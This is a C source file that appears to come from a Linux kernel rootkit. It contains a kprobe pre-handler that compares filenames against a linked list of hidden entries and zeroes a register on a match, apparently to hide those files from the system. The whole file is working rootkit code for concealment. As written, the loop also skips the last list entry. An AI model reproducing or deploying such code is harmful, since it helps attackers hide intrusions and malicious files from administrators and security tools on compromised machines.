#include "../include/debug.h"
#include "../include/config.h"

#include "include/kprobe.h"
#include "include/hide.h"

int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    char *filename = (char *)regs->si;

    struct hidden_list *p_current = hidden_list_head;

    while (p_current != NULL && p_current->entry != NULL)
    {
        char *entry = (char *)p_current->entry;

        RTK_DEBUG("Next entry: %p\n", p_current->next);
        RTK_DEBUG("Checking %s > %s\n", filename, entry);

        if (p_current->next == NULL)
        {
            break;
        }

        if (strcmp(filename, entry) == 0)
        {
            RTK_DEBUG("Hiding %s\n", entry);
            regs->dx = 0;
            break;
        }

        p_current = p_current->next;
    }

    return 0;
}